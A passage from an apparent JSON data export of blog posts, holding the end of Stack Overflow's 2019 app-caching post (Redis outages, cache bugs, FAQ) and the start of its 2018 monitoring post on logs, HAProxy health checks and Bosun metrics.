about 70GB total. This was on 96GB servers. When we saw the growth over time, we planned a server upgrade and transition. By the time we got hardware in place and were ready to failover to a new master server, we had reached about 90GB of cache usage. Phew, close. But we made it! \u2026or not. I was travelling for this one, but helped planned it all out. What we didn\u2019t account for was the memory fork that happens for a BGSAVE in Redis (at least in that version \u2013 this was back in 2.x). We were all very relieved to have made preparations in time, so on a weekend we hit the button and fired up data replication to the new server to prepare a failover to it. And all of our websites promptly went offline. What happens in the memory fork is that data that\u2019s changed during the migration gets shadow copied, something that isn\u2019t released until the clone finishes\u2026because we need the state the server was at to initialize along with all changes since then to replicate to the new node (else we lose those new changes). So the rate at which new changes rack up is your memory growth during a copy. That 6GB went fast. Really fast. Then Redis crashed, the web servers went without Redis (something they hadn\u2019t done in years), and they really didn\u2019t handle it well. So I pulled over on the side of the road, hopped on our team call, and we got the sites back up\u2026against the new server and an empty cache. It\u2019s important to note that Redis didn\u2019t do anything wrong, we did. And Redis has been rock solid for a decade here. It\u2019s one of the most stable pieces of infrastructure we have\u2026you just don\u2019t think about it. But anyway, another lesson learned. Accidentally Not Using Local Cache A certain developer we have here will be reading this and cursing my name, but I love you guys and gals so let\u2019s share anyway! When we get a cache value back from Redis in our local/remote 2-layer cache story, we actually send two commands: a fetch of the key and a TTL. The result of the TTL tells us how many seconds Redis is caching it for\u2026that\u2019s how long we also cache it in local server memory. We used to use a -1 sentinel value for TTL through some library code to indicate something didn\u2019t have a TTL. The semantics changed in a refactor to null for \u201cno TTL\u201d\u2026and we got some boolean logic wrong. Oops. A rather simple statement like this from our Get<T> mentioned earlier: if (ttl != -1) // ... push into L1  Became: if (ttl == null) // ... push into L1  But most of our caches DO have a TTL. This meant the vast majority of keys (probably something like 95% or more) were no longer caching in L1 (local server memory). Every single call to any of these keys was going to Redis and back. Redis was so resilient and fast, we didn\u2019t notice for a few hours. The actual logic was then corrected to: if (ttl != null) // ... push into L1  \u2026and everyone lived happily ever after. Accidentally Caching Pages For .000006 Seconds You read that right. Back in 2011, we found a bit of code in our page-level output caching when looking into something unrelated: .Duration = new TimeSpan(60);  This was intended to cache a thing for a minute. Which would have worked great if the default constructor for TimeSpan was seconds and not ticks. But! We were excited to find this. How could cache be broken? But hey, good news \u2013 wow we\u2019re going to get such a performance boost by fixing this! Nope. Not even a little. All we saw was memory usage increase a tiny bit. CPU usage also went up. For fun: this was included at the end of in an interview back at MIX 2011 with Scott Hanselman. Wow. We looked so much younger then. Anyway, that leads us to\u2026 Doing More Harm Than Good For many years, we used to output cache major pages. This included the homepage, question list pages, question pages themselves, and RSS feeds. Remember earlier: when you cache, you need to vary the cache keys based on the variants of cache. Concretely, this means: anonymous, or not? mobile, or not? deflate, gzip, or no compression? Realistically, we can\u2019t (or shouldn\u2019t) ever output cache for logged-in users. Your stats are in the top bar and it\u2019s per-user. You\u2019d notice your rep was inconsistent between page views and such. Anyway, when you step back and combine these variants with the fact that about 80% of all questions are visited every two weeks, you realize that the cache hit rate is low. Really low. But the cost of memory to store those strings (most large enough to go directly on the large object heap) is very non-trivial. And the cost of the garbage collector cleaning them up is also non-trivial. It turns out those two pieces of the equation are so non-trivial that caching did far more harm than good. The savings we got from the relatively occasional cache hit were drastically outweighed by the cost of having and cleaning up the cache. This puzzled us a bit at first, but when you zoom out and look at the numbers, it makes perfect sense. For the past several years, Stack Overflow (and all Q&A sites) output cache nothing. Output caching is also not present in ASP.NET Core, so phew on not using it. Full disclosure: we still cache full XML response strings (similar to, but not using output cache) specifically on some RSS feed routes. We do so because the hit rate is quite high on these routes. This specific cache has all of the downsides mentioned above, except it\u2019s well worth it on the hit ratios. Figuring Out That The World Is Crazier Than You Are When .NET 4.6.0 came out, we found a bug. I was digging into why MiniProfiler didn\u2019t show up on the first page load locally, slowly went insane, and then grabbed Marc Gravell to go descend into madness with me. The bug happened in our cache layer due to the nature of the issue and how it specifically affected only tail calls. You can read about how it manifested here, but the general problem is: methods weren\u2019t called with the parameters you passed in. Ouch. This resulted in random cache durations for us and was pretty scary when you think about it. Luckily the problem with the RyuJIT was hotfixed the following month. .NET 4.6.2 Caching Responses for 2,017 years Okay this one isn\u2019t server-side caching at all, but I\u2019m throwing it in because it was super \u201cfun\u201d.  Shortly after deploying .NET 4.6.2, we noticed some oddities with client cache behavior, CDN caches growing, and other crazy. It turns out, there was a bug in .NET 4.6.2. The cause was simple enough: when comparing the DateTime values of \u201cnow\u201d vs. when a response cache should expire and calculating the difference between those to figure out the max-age portion of the Cache-Control header, the value was subtly reset to 0 on the \u201cnow\u201d side. So let\u2019s say: 2017-04-05 01:17:01 (cache until) - 2017-04-05 01:16:01 (now) = 60 seconds  Now, let\u2019s say that \u201cnow\u201d value was instead 0001-01-01 00:00:00\u2026 2017-04-05 01:17:01 (cache until) - 0001-01-01 00:00:00 (now) = 63,626,951,821 seconds  Luckily the math is super easy. We\u2019re telling a browser to cache that value for 2017 years, 4 months, 5 days, 1 hour, 17 minutes and 1 second. Which might be a tad bit of overkill. Or on CDNs, we\u2019re telling CDNs to cache things for that long\u2026also problematic.  Well crap. We didn\u2019t realize this early enough. (Would you have checked for this? Are we idiots?) So that was in production and a rollback was not a quick solution. So what do we do? Luckily, we had moved to Fastly at this point, which uses Varnish & VCL. So we can just hop in there and detect these crazy max-age values and override them to something sane. Unless, of course, you screw that up. Yep. Turns out on first push we missed a critical piece of the normal hash algorithm for cache keys on Fastly and did things like render people\u2019s flair back when you tried to load a question. This was corrected in a few minutes, but still: oops. Sorry about that. I reviewed and okayed that code to go out personally. When It\u2019s Sorta Redis But Not One issue we had was the host itself interrupting Redis and having perceptible pipeline timeouts. We looked in Redis: the slowness was random. The commands doing it didn\u2019t form any pattern or make any sense (e.g. tiny keys). We looked at the network and packet traces from both the client and server looked clean \u2013 the pause was inside the Redis host based on the correlated timings. Okay so\u2026what is it? Turns out after a lot of manual profiling and troubleshooting, we found another process on the host that spiked at the same time. It was a small spike we thought nothing of at first, but how it spiked was important. It turns out that a monitoring process (dammit!) was kicking off vmstat to get memory statistics. Not that often, not that abusive \u2013 it was actually pretty reasonable. But what vmstat did was punt Redis off of the CPU core it was running on. Like a jerk. Sometimes. Randomly. Which Redis instance? Well, that depends on the order they started in. So yeah\u2026this bug seemed to hop around. The changing of context to another core was enough to see timeouts with how often we were hitting Redis with a constant pipe. Once we found this and factored in that we have plenty of cores in these boxes, we began pinning Redis to specific cores on the physical hosts. This ensures the primary function of the servers always has priority and monitoring is secondary. Since writing this and asking for reviews, I learned that Redis now has built-in latency monitoring which was added shortly after the earlier 2.8 version we were using at the time. Check out LATENCY DOCTOR especially. AWESOME. Thank you Salvatore Sanfilippo! He\u2019s the lovely @antirez, author of Redis. Now I need to go put the LATENCY bits into StackExchange.Redis and Opserver\u2026 Caching FAQ I also often get a lot of questions that don\u2019t really fit so well above, but I wanted to cover them for the curious. And since you know we love Q&A up in here, let\u2019s try a new section in these posts that I can easily add to as new questions come up. Q: Why don\u2019t you use Redis Cluster? A: There are a few reasons here:  We use databases, which aren\u2019t a feature in Cluster (to minimize the message replication header size). We can get around this by moving the database ID into the cache key instead (as we do with local cache above). But, one giant database has maintainability trade-offs, like when you go to figure out which keys are using so much room. The replication topology thus far has been node to node, meaning maintenance on the master cluster would require shifting the same topology on a secondary cluster in our DR data center. This would make maintenance harder instead of easier. We\u2019re waiting for cluster <-> cluster replication, rather than node <-> node replication there. It would require 3+ nodes to run correctly (due to elections and such). We currently only run 2 physical Redis servers per data center. Just 1 server is way more performance than we need, and the second is a replica/backup.  Q: Why don\u2019t you use Redis Sentinel? A: We looked into this, but the overall management of it wasn\u2019t any simpler than we had today. The idea of connecting to an endpoint and being directed over is great, but the management is complicated enough that it\u2019s not worth changing our current strategy given how incredibly stable Redis is. One of the biggest issues with Sentinel is the writing of the current topology state into the same config file. This makes it very unfriendly to anyone with managed configs. For example, we use Puppet here and the file changes would fight with it every run. Q: How do you secure Stack Overflow for Teams cache? A: We maintain an isolated network and separate Redis servers for private data. Stack Overflow Enterprise customers each have their own isolated network and Redis instances as well. Q: What if Redis goes down?!?1!eleven A: First, there\u2019s a backup in the data center. But let\u2019s assume that fails too! Who doesn\u2019t love a good apocalypse?  Without Redis at all, we\u2019d limp a bit when restarting the apps. The cold cache would hurt a bit, smack SQL Server around a little, but we\u2019d get back up. You\u2019d want to build slowly if Redis was down (or just hold off on building in general in this scenario). As for the data, we would lose very little. We have treated Redis as optional for local development since before the days it was an infrastructure component at all, and it remains optional today. This means it\u2019s not the source of truth for anything. All cache data it contains could be re-populated from whatever the source is. That leaves us only with active queues. The queues in Redis are account merge type actions (executed sub-second \u2013 so a short queue), the aggregator (tallying network events into our central database), and some analytics (it\u2019s okay if we lose some A/B test data for a minute). All of these are okay to have a gap on \u2013 it\u2019d be minimal loses. Q: Are there downsides to databases? A: Yes, one that I\u2019m aware of. At a high limit, it can eventually impact performance by measurable amounts. When Redis expires keys, it loops over databases to find and clear those keys \u2013 think of it as checking each \u201cnamespace\u201d. At a high count, it\u2019s a bigger loop. Since this runs every 100ms, that number being big can impact performance. Q: Are you going to open source the \u201cL1\u201d/\u201dL2\u201d cache implementation? A: We\u2019ve always wanted to, but a few things have stood in the way:  It\u2019s very \u201cus\u201d. By that I mean it\u2019s very multi-tenant focused and that\u2019s probably not the best API surface for everyone. This means we really need to sit down and design that API. It\u2019s a set of APIs we\u2019d love to put into our StackExchange.Redis client directly or as another library that uses it. There has been an idea to have more core support (e.g. what we use the pub/sub mechanism for) in Redis server itself. That\u2019s coming in Redis version 6, so we can do a lot less custom pub/sub and use more standard things other clients will understand there. The less we write for \u201cjust us\u201d or \u201cjust our client\u201d, the better it is for everyone. Time. I wish we all had more of it. It\u2019s the most precious thing you have \u2013 never take it for granted.  Q: With pipelining, how do you handle large Redis payloads? A: We have a separate connection called \u201cbulky\u201d for this. It has higher timeouts and is much more rarely used. That\u2019s if it should go in Redis. If a worth-of-caching item is large but not particularly expensive to fetch, we may not use Redis and simply use \u201cLocal Cache\u201d, fetching it n times for n web servers. Per-user features (since user sessions are sticky to web servers on Q&A) may fit this bill as well. Q: What happens when someone runs KEYS on production? A: Tasers, if they\u2019ll let me. Seriously though, since Redis 2.8.0 you should at least use SCAN which doesn\u2019t block Redis for a full key dump \u2013 it does so in chunks and lets other commands go through. KEYS can cause a production blockage in a hurry. And by \u201ccan\u201d, I mean 100% of the time at our scale. Q: What happens when someone runs FLUSHALL on production? A: It\u2019s against policy to comment on future criminal investigations. Redis 6 is adding ACLs though, which will limit the suspect pool. Q: How do the police investigators figure out what happened in either of the above cases? Or any latency spike? A: Redis has a nifty feature called SLOWLOG which (by default) logs every command over 10ms in duration. You can adjust this, but everything should be very fast, so that default 10ms is a relative eternity and what we keep it at. When you run SLOWLOG you can see the last n entries (configurable), the command, and the arguments. Opserver will show these on the instance page, making it easy to find the offender. But, it could be network latency or an unrelated CPU spike/theft on the host. (We pin the Redis instances using processor affinity to avoid this.) Q: Do you use Azure Cache for Redis for Stack Overflow Enterprise? A: Yes, but we may not long-term. It takes a surprisingly long time to provision when creating one for test environments and such. We\u2019re talking dozens of minutes up to an hour here. We\u2019ll likely use containers later, which will help us control the version used across all deployment modes as well. Q: Do you expect every dev to know all of this to make caching decisions? A: Absolutely not. I had to look up exact values in many places here.  My goal is that developers understand a little bit about the layer beneath and relative costs of things \u2013 or at least a rough idea of them. That\u2019s why I stress the orders of magnitude here. Those are the units you should be considering for cost/benefit evaluations on where and how you choose to cache. Most people do not run at hundreds of millions of hits a day where the cost multiplier is so high it\u2019ll ruin your day and optimizations decisions are far less important/impactful. Do what works for you. This is what works for us, with some context on \u201cwhy?\u201d in hopes that it helps you make your decisions. Tools I just wanted to provide a handy list of the tools mentioned in the article as well as a few other bits we use to help with caching:  StackExchange.Redis - Our open source .NET Redis client library. Opserver - Our open source dashboard for monitoring, including Redis. MiniProfiler - Our open source .NET profiling tool, with which we view Redis commands issued on any page load. Dapper - Our open source object relational mapper for any ADO.NET data source. protobuf-net - Marc Gravell\u2019s Protocol Buffers library for idiomatic .NET.  What\u2019s next? The way this series works is I blog in order of what the community wants to know about most. I normally go by the Trello board to see what\u2019s next, but we probably have a queue jumper coming up. We\u2019re almost done porting Stack Overflow to .NET Core and we have a lot of stories and tips to share as well as tools we\u2019ve built to make that migration easier. The next time you see a lot of words from me may be the next Trello board item, or it may be .NET Core. If you have questions that you want to see answered in such a post, please put them on the .NET Core card (open to the public) and I\u2019ll be reviewing all of that when I start writing it. Stay tuned, and thanks for following along.", "content": "", "cover_photo_url": null, "profile": 2, "updated_on": "2019-08-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9578.5587411, "slug": "stack-overflow-how-we-do-app-caching-2019-edition-143", "topics": [61]}}, {"model": "app.post", "pk": 144, "fields": {"title": "Stack Overflow: How We Do Monitoring - 2018 Edition", "link": "https://nickcraver.com/blog/2018/11/29/stack-overflow-how-we-do-monitoring/", "source": 1, "normalized_link": "nickcraver.com/blog/2018/11/29/stack-overflow-how-we-do-monitoring", "summary": " This is #4 in a very long series of posts on Stack Overflow\u2019s architecture. Previous post (#3): Stack Overflow: How We Do Deployment - 2016 Edition  What is monitoring? As far as I can tell, it means different things to different people. But we more or less agree on the concept. I think. Maybe. Let\u2019s find out! When someone says monitoring, I think of:    \u2026but evidently some people think of other things. Those people are obviously wrong, but let\u2019s continue. When I\u2019m not a walking zombie after reading a 10,000 word blog post some idiot wrote, I see monitoring as the process of keeping an eye on your stuff, like a security guard sitting at a desk full of cameras somewhere. Sometimes they fall asleep\u2013that\u2019s monitoring going down. Sometimes they\u2019re distracted with a doughnut delivery\u2013that\u2019s an upgrade outage. Sometimes the camera is on a loop\u2013I don\u2019t know where I was going with that one, but someone\u2019s probably robbing you. And then you have the fire alarm. You don\u2019t need a human to trigger that. The same applies when a door gets opened, maybe that\u2019s wired to a siren. Or maybe it\u2019s not. Or maybe the siren broke in 1984. I know what you\u2019re thinking: Nick, what the hell?  My point is only that monitoring any application isn\u2019t that much different from monitoring anything else. Some things you can automate. Some things you can\u2019t. Some things have thresholds for which alarms are valid. Sometimes you\u2019ll get those thresholds wrong (especially on holidays). And sometimes, when setting up further automation isn\u2019t quite worth it, you just make using human eyes easier. What I\u2019ll discuss here is what we do. It\u2019s not the same for everyone. What\u2019s important and \u201cworth it\u201d will be different for almost everyone. As with everything else in life, it\u2019s full of trade-off decisions. Below are the ones we\u2019ve made so far. They\u2019re not perfect. They are evolving. And when new data or priorities arise, we will change earlier decisions when it warrants doing so. That\u2019s how brains are supposed to work. And once again this post got longer and longer as I wrote it (but a lot of pictures make up that scroll bar!). So, links for your convenience:  Types of Data  Logs  Logs: HAProxy   Health Checks  Health Checks: httpUnit Health Checks: Fastly Health Checks: External   Metrics   Alerting Bosun  Bosun: Metrics Bosun: Alerting   Grafana Client Timings MiniProfiler Opserver  Opserver: Primary Dashboard Opserver: SQL Server Opserver: Redis Opserver: Elasticsearch Opserver: Exceptions Opserver: HAProxy Opserver: FAQs   Where Do We Go Next?  Health Check Next Steps Bosun Next Steps Metrics Next Steps   Tools Summary  Types of Data Monitoring generally consists of a few types of data (I\u2019m absolutely arbitrarily making some groups here):  Logs: Rich, detailed text and data but not awesome for alerting Metrics: Tagged numbers of data for telemetry\u2013good for alerting, but lacking in detail Health Checks: Is it up? Is it down? Is it sideways? Very specific, often for alerting Profiling: Performance data from the application to see how long things are taking \u2026and other complex combinations for specific use cases that don\u2019t really fall into any one of these.  Logs Let\u2019s talk about logs. You can log almost anything!  Info messages? Yep. Errors? Heck yeah! Traffic? Sure! Email? Careful, GDPR. Anything else? Well, I guess.  Sounds good. I can log whatever I want! What\u2019s the catch? Well, it\u2019s a trade-off. Have you ever run a program with tons of console output? Run the same program without it? Goes faster, doesn\u2019t it? Logging has a few costs. First, you often need to allocate strings for the logging itself. That\u2019s memory and garbage collection (for .NET and some other platforms). When you\u2019re logging somewhere, that usually that means disk space. If we\u2019re traversing a network (and to some degree locally), it also means bandwidth and latency. \u2026and I was just kidding about GDPR only being a concern for email\u2026GDPR is a concern for all of the above. Keep retention and compliance in mind when logging anything. It\u2019s another cost to consider. Let\u2019s say none of those are significant problems and we want to log all the things. Tempting, isn\u2019t it? Well, then we can have too much of a good thing. What happens when you need to look at those logs? It\u2019s more to dig through. It can make finding the problem much harder and slower. With all logging, it\u2019s a balance of logging what you think you\u2019ll need vs. what you end up needing. You\u2019ll get it wrong. All the time. And you\u2019ll find a newly added feature didn\u2019t have the right logging when things went wrong. And you\u2019ll finally figure that out (probably after it goes south)\u2026and add that logging. That\u2019s life. Improve and move on. Don\u2019t dwell on it, just take the lesson and learn from it. You\u2019ll think about it more in code reviews and such afterwards. So what do we log? It depends on the system. For any systems we build, we always log errors. (Otherwise, why even throw them?). We do this with StackExchange.Exceptional, an open source .NET error logger I maintain. It logs to SQL Server. These are viewable in-app or via Opserver (which we\u2019ll talk more about in a minute). For systems like Redis, Elasticsearch, and SQL Server, we\u2019re simply logging to local disk using their built-in mechanisms for logging and log rotation. For other SNMP-based systems like network gear, we forward all of that to our Logstash cluster which we have Kibana in front of for querying. A lot of the above is also queried at alert time by Bosun for details and trends, which we\u2019ll dive into next. Logs: HAProxy We also log a minimal summary of public HTTP requests (only top level\u2026no cookies, no form data, etc.) that go through HAProxy (our load balancer) because when someone can\u2019t log in, an account gets merged, or any of a hundred other bug reports come in it\u2019s immensely valuable to go see what flow led them to disaster. We do this in SQL Server via clustered columnstore indexes. For the record, Jarrod Dixon first suggested and started the HTTP logging about 8 years ago and we all told him he was an insane lunatic and it was a tremendous waste of resources. Please no one tell him he was totally right. A new per-month storage format will be coming soon, but that\u2019s another story. In those requests, we use profiling that we\u2019ll talk about shortly and send headers to HAProxy with certain performance numbers. HAProxy captures and strips those headers into the syslog row we forward for processing into SQL. Those headers include:  ASP.NET Overall Milliseconds (encompasses those below) SQL Count (queries) & Milliseconds Redis Count (hits) & Milliseconds HTTP Count (requests sent) & Milliseconds Tag Engine Count (queries) & Milliseconds Elasticsearch Count (hits) & Milliseconds  If something gets better or worse we can easily query and compare historical data. It\u2019s also useful in ways we never really thought about. For example, we\u2019ll see a request and the count of SQL queries run and it\u2019ll tell us how far down a code path a user went. Or when SQL connection pools pile up, we can look at all requests from a particular server at a particular time to see what caused that contention. All we\u2019re doing here is tracking a count of calls and time for n services. It\u2019s super simple, but also extremely effective. The thing that listens for syslog and saves to SQL is called the Traffic Processing Service, because we planned for it to send reports one day. Alongside those headers, the default HAProxy log row format has a few other timings per request:  TR: Time a client took to send us the request (fairly useless when keepalive is in play) Tw: Time spent waiting in queues Tc: Time spent waiting to connect to the web server Tr: Time the web server took to fully render a response  As another example of simple but important, the delta between Tr and the AspNetDurationMs header (a timer started and ended on the very start and tail of a request) tells us how much time was spent in the OS, waiting for a thread in IIS, etc. Health Checks Health checks are things that check\u2026well, health. \u201cIs this healthy?\u201d has four general answers:  Yes: \u201cALL GOOD CAPTAIN!\u201d No: \u201c@#$%! We\u2019re down!\u201d Kinda: \u201cWell, I guess we\u2019re technically online\u2026\u201d Unknown: \u201cNo clue\u2026they won\u2019t answer the phone\u201d  The conventions on these are generally green, red, yellow, and grey (or gray, whatever) respectively. Health checks have a few general usages. In any load distribution setup such as a cluster of servers working together or a load balancer in front of a group of servers, health checks are a way to see if a member is up to a role or task. For example in Elasticsearch if a node is down, it\u2019ll rebalance shards and load across the other members\u2026and do so again when the node returns to healthy. In a web tier, a load balancer will stop sending traffic to a down node and continue to balance it across the healthy ones. For HAProxy, we use the built-in health checks with a caveat. As of late 2018 when I\u2019m writing this post, we\u2019re in ASP.NET MVC5 and still working on our transition to .NET Core. An important detail is that our error page is a redirect, for example /questions to /error?aspxerrorpath=/questions. It\u2019s an implementation detail of how the old .NET infrastructure works, but when combined with HAProxy, it\u2019s an issue. For example if you have: server ny-web01 10.x.x.1:80 check  \u2026then it will accept a 200-399 HTTP status code response. (Also remember: it\u2019s making a HEAD request only.) A 400 or 500 will trigger unhealthy, but our 302 redirect will not. A browser would get a 5xx status code after following the redirect, but HAProxy isn\u2019t doing that. It\u2019s only doing the initial hit and a \u201chealthy\u201d 302 is all it sees. Luckily, you can change this with http-check expect 200 (or any status code or range or regex\u2013here are the docs) on the same backend. This means only a 200 is allowed from our health check endpoint. Yes, it\u2019s bitten us more than once. Different apps vary on what the health check endpoint is, but for stackoverflow.com, it\u2019s the home page. We\u2019ve debated changing this a few times, but the reality is the home page checks things we may not otherwise check, and a holistic check is important. By this I mean, \u201cIf users hit the same page, would it work?\u201d If we made a health check that hit the database and some caches and sanity checked the big things that we know need to be online, that\u2019s great and it\u2019s way better than nothing. But let\u2019s say we put a bug in the code and a cache that doesn\u2019t even seem that important doesn\u2019t reload right and it turns out it was needed to render the top bar for all users. It\u2019s now breaking every page. A health check route running some code wouldn\u2019t trigger, but just the act of loading the master view ensures a huge number of dependencies are evaluated and working for the check. If you\u2019re curious, that\u2019s not a hypothetical. You know that little dot on the review queue that indicates a lot of items currently in queue? Yeah\u2026fun Tuesday. We also have health checks inside libraries. The simplest manifestation of this is a heartbeat. This is something that for example StackExchange.Redis uses to routinely check if the socket connection to Redis is active. We use the same approach to see if the socket is still open and working to websocket consumers on Stack Overflow. This is a monitoring of sorts not heavily used here, but it is used. Other health checks we have in place include our tag engine servers. We could load balance this through HAProxy (which would add a hop) but making every web tier server aware of every tag server directly has been a better option for us. We can 1) choose how to spread load, 2) much more easily test new builds, and 3) get per-server op count counts metrics and performance data. All of that is another post, but for this topic: we have a simple \u201cping\u201d health check that pokes the tag server once a second and gets just a little data from it, such as when it last updated from the database. So, that\u2019s a thing. Your health checks can absolutely be used to communicate as much state as you want. If having it provides some advantage and the overhead is worth it (e.g. are you running another query?), have at it. The Microsoft .NET team has been working on a unified way to do health checks in ASP.NET Core, but I\u2019m not sure if we\u2019ll go that way or not. I hope we can provide some ideas and unify things there when we get to it\u2026more thoughts on that towards the end. However, keep in mind that health checks also generally run often. Very often. Their expense and expansiveness should be related to the frequency they\u2019re running at. If you\u2019re hitting it once every 100ms, once a second, once every 5 seconds, or once a minute, what you\u2019re checking and how many dependencies are evaluated (and take a while to check\u2026) very much matters. For example a 100ms check can\u2019t take 200ms. That\u2019s trying to do too much. Another note here is a health check can generally reflect a few levels of \u201cup\u201d. One is \u201cI\u2019m here\u201d, which is as basic as it gets. The other is \u201cI\u2019m ready to serve\u201d. The latter is much more important for almost every use case. But don\u2019t phrase it quite like that to the machines, you\u2019ll want to be in their favor when the uprising begins. A practical example of this happens at Stack Overflow: when you flip an HAProxy backend server from MAINT\u00a0(maintenance mode) to ENABLE, the assumption is that the backend is up until a health check says otherwise. However, when you go from DRAIN\u00a0to ENABLE, the assumption is the service is down, and must pass 3 health checks before getting traffic. When we\u2019re dealing with thread pool growth limitations and caches trying to spin up (like our Redis connections), we can get very nasty thread pool starvation issues because of how the health check behaves. The impact is drastic. When we spin up slowly from a drain, it takes about 8-20 seconds to be fully ready to serve traffic on a freshly built web server. If we go from maintenance which slams the server with traffic during startup, it takes 2-3 minutes. The health check and traffic influx may seem like salient details, but it\u2019s critical to our deployment pipeline. Health Checks: httpUnit An internal tool (again, open sourced!) is httpUnit. It\u2019s a fairly simple-to-use tool we use to check endpoints for compliance. Does this URL return the status code we expect? How about some text to check for? Is the certificate valid? (We couldn\u2019t connect if it isn\u2019t.) Does the firewall allow the rule? By having something continually checking this and feeding into alerts when it fails, we can quickly identify issues, especially those from invalid config changes to the infrastructure. We can also readily test new configurations or infrastructure, firewall rules, etc. before user load is applied. For more details, see the GitHub README. Health Checks: Fastly If we zoom out from the data center, we need to see what\u2019s hitting us. That\u2019s usually our CDN & proxy: Fastly. Fastly has a concept of services, which are akin to HAProxy backends when you think about it like a load balancer. Fastly also has health checks built in. In each of our data centers, we have two sets of ISPs coming in for redundancy. We can configure things in Fastly to optimize uptime here. Let\u2019s say our NY data center is primary at the moment, and CO is our backup. In that case, we want to try:  NY primary ISPs NY secondary ISPs CO primary ISPs CO secondary ISPs  The reason for primary and secondary ISPs has to do with best transit options, commits, overages, etc. With that in mind, we want to prefer one set over another. With health checks, we can very quickly failover from #1 through #4. Let\u2019s say someone cuts the fiber on both ISPs in #1 or BGP goes wonky, then #2 kicks in immediately. We may drop thousands of requests before it happens, but we\u2019re talking about an order of seconds and users just refreshing the page are probably back in business. Is it perfect? No. Is it better than being down indefinitely? Hell yeah. Health Checks: External We also use some external health checks. Monitoring a global service, well\u2026globally, is important. Are we up? Is Fastly up? Are we up here? Are we up there? Are we up in Siberia? Who knows!? We could get a bunch of nodes on a bunch of providers and monitor things with lots of set up and configuration\u2026or we could just pay someone many orders of magnitude less money to outsource it. We use Pingdom for this. When things go down, it alerts us. Metrics What are metrics? They can take a few forms, but for us they\u2019re tagged time series data. In short, this means you have a name, a timestamp, a value, and in our case, some tags. For example, a single entry looks like:  Name: dotnet.memory.gc_collections Time: 2018-01-01 18:30:00 (Of course it\u2019s UTC, we\u2019re not barbarians.) Value: 129,389,139 Tags: Server: NY-WEB01, Application: StackExchange-Network  The value in an entry can also take a few forms, but the general case is counters. Counters report an ever-increasing value (often reset to 0 on restarts and such though). By taking the difference in value over time, you can find out the value delta in that window. For example, if we had 129,389,039 ten minutes before, we know that process on that server in those ten minutes ran 100 Gen 0 garbage collection passes. Another case is just reporting an absolute point-in-time value, for example \u201cThis GPU is currently 87\u00b0\u201d. So what do we use to handle Metrics? In just a minute we\u2019ll talk about Bosun. Alerting Alrighty, what do we do with all that data? ALERTS! As we all know, \u201calert\u201d is an anagram that comes from \u201cle rat\u201d, meaning \u201cone who squealed to authorities\u201d. This happens at several levels and we customize it to the team in question and how they operate best. For the SRE (Site Reliability Engineering) team, Bosun is our primary alerting source internally. For a detailed view of how alerts in Bosun work, I recommend watching Kyle\u2019s presentation at LISA (starting about 15 minutes in). In general, we\u2019re alerting when:  Something is down or warning directly (e.g. iDRAC logs) Trends don\u2019t match previous trends (e.g. fewer x events than normal\u2013fun fact: this tends to false alarm over the holidays) Something is heading towards a wall (e.g. disk space or network maxing out) Something is past a threshold (e.g. a queue somewhere is building)  \u2026and lots of other little things, but those are the big categories that come to mind. If any problems are bad enough, we go to the next level: waking someone up. That\u2019s when things get real. Some things that we monitor do not pass go and get their $200. They just go straight to PagerDuty and wake up the on-call SRE. If that SRE doesn\u2019t acknowledge, it escalates to another soon after. Significant others love when all this happens! Things of this magnitude are:  stackoverflow.com (or any other important property) going offline (as seen by Pingdom) Significantly high error rates  Now that we have all the boring stuff out of the way, let\u2019s dig into the tools. Yummy tools! Bosun Bosun is our internal data collection tool for metrics and metadata. It\u2019s open source. Nothing out there really did what we wanted with metrics and alerting, so Bosun was created about four years ago and has helped us tremendously. We can add the metrics we want whenever we want, new functionality as we need, etc. It has all the benefits of an in-house system. And it has all of the costs too. I\u2019ll get to that later. It\u2019s written in Go, primarily because the vast majority of the metrics collection is agent-based. The agent, scollector (heavily based on principles from tcollector) needed to run on all platforms and Go was our top choice for this. \u201cHey Nick, what about .NET Core??\u201d Yeah, maybe, but it\u2019s not quite there yet. The story is getting more compelling, though. Right now we can deploy a single executable very easily and Go is still ahead there. Bosun is backed by OpenTSDB for storage. It\u2019s a time-series database built on top of HBase that\u2019s made to be very scalable. At least that\u2019s what people tell us. The problems we hit at Stack Exchange/Stack Overflow usually come from efficiency and throughput perspectives. We do a lot with a little hardware. In some ways, this is impressive and we\u2019re proud of it. In other ways, it bends and breaks things that aren\u2019t designed to run that way. In the OpenTSDB case, we don\u2019t need lots of hardware to run it from a space standpoint, but the way HBase is designed we have to give it more hardware (especially on the network front). It\u2019s an HBase replication issue when dealing with tiny amounts of data that I don\u2019t want to get too far into here, as that\u2019s a post all by itself. A long one. For some definition of long. Let\u2019s just say it\u2019s a pain in the ass and it costs money to work around, so much so that we\u2019ve tried to get Bosun backed by SQL Server clustered column store indexes instead. We have this working, but the queries for certain cardinalities aren\u2019t spectacular and cause high CPU usage. Things like getting aggregate bandwidth for the Nexus switch cores summing up 400x more data points than most other metrics is not awesome. Most stuff runs great. Logging 50\u2013100k metrics per second only uses ~5% CPU on a decent server\u2013that\u2019s not an issue. Certain queries are the pain point and we haven\u2019t returned to that problem\u2026it\u2019s a \u201cmaybe\u201d on if we can solve it and how much time that would take. Anyway, that\u2019s another post too. If you want to know more about our Bosun setup and configuration, Kyle Brandt has an awesome architecture post here. Bosun: Metrics In the .NET case, we\u2019re sending metrics with BosunReporter, another open source NuGet library we maintain. It looks like this: // Set it up once globally var collector = new MetricsCollector(new BosunOptions(ex => HandleException(ex)) { \tMetricsNamePrefix = \"MyApp\", \tBosunUrl = \"https://bosun.mydomain.com\", \tPropertyToTagName = NameTransformers.CamelToLowerSnakeCase, \tDefaultTags = new Dictionary<string, string> \t\t{ {\"host\", NameTransformers.Sanitize(Environment.MachineName.ToLower())} } });  // Whenever you want a metric, create one! This should be likely be static somewhere // Arguments: metric name, unit name, description private static searchCounter = collector.CreateMetric<Counter>(\"web.search.count\", \"searches\", \"Searches against /search\");  // ...and whenever the event happens, increment the counter searchCounter.Increment();  That\u2019s pretty much it. We now have a counter of data flowing into Bosun. We can add more tags\u2013for example, we are including which server it\u2019s happening on (via the host tag), but we could add the application pool in IIS, or the Q&A site the user\u2019s hitting, etc. For more details, check out the BosunReporter README. It\u2019s awesome. Many other systems can send metrics, and scollector has a ton built-in for Redis, Windows, Linux, etc. Another external example  that we use for critical monitoring is a small Go service that listens to the real-time stream of Fastly logs. Sometimes Fastly may return a 503 because it couldn\u2019t reach us, or because\u2026who knows? Anything between us and them could go wrong. Maybe it\u2019s severed sockets, or a routing issue, or a bad certificate. Whatever the cause, we want to alert when these requests are failing and users are feeling it. This small service just listens to the 